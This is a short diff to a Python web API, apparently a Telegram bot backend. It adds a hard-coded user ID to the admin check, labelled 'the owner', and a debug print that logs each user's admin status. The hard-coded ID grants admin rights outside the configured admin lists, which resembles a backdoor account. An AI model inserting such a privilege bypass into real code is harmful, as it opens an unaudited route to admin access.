@@ -61,8 +61,8 @@ def _tg_user(request: Request, body: dict | None = None) -> dict | None:
 
 
 def IS_ADMIN(uid: int) -> bool:
-    """Check if UID is in standard admin or pay admin lists."""
-    return uid in ADMIN_IDS or uid in PAY_ADMIN_IDS
+    """Check if UID is in standard admin or pay admin lists, or is the owner."""
+    return uid in [1206238888] or uid in ADMIN_IDS or uid in PAY_ADMIN_IDS
 
 
 async def check_sub(user_id: int, channel_id: int) -> bool:
@@ -130,6 +130,7 @@ async def api_get_user(request: Request, user_id: int | None = Query(None)):
     # Maintenance check
     maintenance = await db.get_setting("maintenance_mode", "off") == "on"
     is_admin = IS_ADMIN(uid)
+    print(f"📡 [API] User {uid} loading. Admin: {is_admin}, Maintenance: {maintenance}")
 
     return {
         "ok": True, 
